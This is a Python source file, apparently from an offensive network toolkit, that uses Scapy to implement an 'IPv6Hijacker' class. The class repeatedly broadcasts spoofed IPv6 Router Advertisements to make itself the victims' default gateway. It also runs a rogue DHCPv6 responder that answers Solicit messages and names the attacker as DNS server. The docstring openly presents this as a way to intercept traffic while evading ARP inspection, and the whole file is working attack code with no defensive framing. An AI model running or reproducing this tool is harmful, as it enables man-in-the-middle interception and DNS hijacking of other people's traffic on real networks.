"""
network/ipv6.py — IPv6 Router Advertisement (RA) Spoofing.

Exploits the IPv6 blind spot by telling targets we are their default IPv6 router.
This allows us to intercept traffic even if IPv4 is guarded by ARP Inspection (DAI).
"""
from __future__ import annotations
import threading
import time
from scapy.all import (
    Ether, IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, 
    UDP, DHCP6_Advertise, DHCP6_Reply, DHCP6_Solicit, 
    DHCP6OptDNSServers, DHCP6OptIA_NA, DHCP6OptServerId, 
    sniff, sendp
)

class IPv6Hijacker:
    def __init__(self, iface: str, my_mac: str):
        self.iface = iface
        self.my_mac = my_mac
        self._running = False
        self._thread_ra = None
        self._thread_dhcp = None

    def start(self):
        if self._running: return
        self._running = True
        # Layer 1: RA Spoofing (Gateway Hijack)
        self._thread_ra = threading.Thread(target=self._ra_loop, daemon=True, name="ipv6_ra_spoof")
        self._thread_ra.start()
        # Layer 2: Rogue DHCPv6 (DNS Hijack)
        self._thread_dhcp = threading.Thread(target=self._dhcp_sniff, daemon=True, name="rogue_dhcpv6")
        self._thread_dhcp.start()

    def stop(self):
        self._running = False

    def _ra_loop(self):
        # Advertise us as default router
        pkt = (
            Ether(src=self.my_mac, dst="33:33:00:00:00:01") /
            IPv6(src="fe80::1", dst="ff02::1") /
            ICMPv6ND_RA(chlim=64, prf=1, routerlifetime=1800) /
            ICMPv6NDOptPrefixInfo(prefix="2001:db8:1::", prefixlen=64, L=1, A=1)
        )
        while self._running:
            try: sendp(pkt, iface=self.iface, verbose=False)
            except Exception: pass
            time.sleep(3)

    def _dhcp_sniff(self):
        """Listen for DHCPv6 Solicit and offer ourselves as DNS server."""
        def _cb(pkt):
            if not pkt.haslayer(DHCP6_Solicit): return
            
            # Send ADVERTISE
            adv = (
                Ether(src=self.my_mac, dst=pkt[Ether].src) /
                IPv6(src="fe80::1", dst=pkt[IPv6].src) /
                UDP(sport=547, dport=546) /
                DHCP6_Advertise(trid=pkt[DHCP6_Solicit].trid) /
                DHCP6OptServerId(duid=b"\x00\x01\x00\x01\x12\x34") /
                DHCP6OptDNSServers(dnsservers=["fe80::1"]) # Redirect to us
            )
            try: sendp(adv, iface=self.iface, verbose=False)
            except Exception: pass

        while self._running:
            try:
                sniff(filter="udp port 547", prn=_cb, iface=self.iface, store=0, timeout=10)
            except Exception:
                if self._running: time.sleep(2)
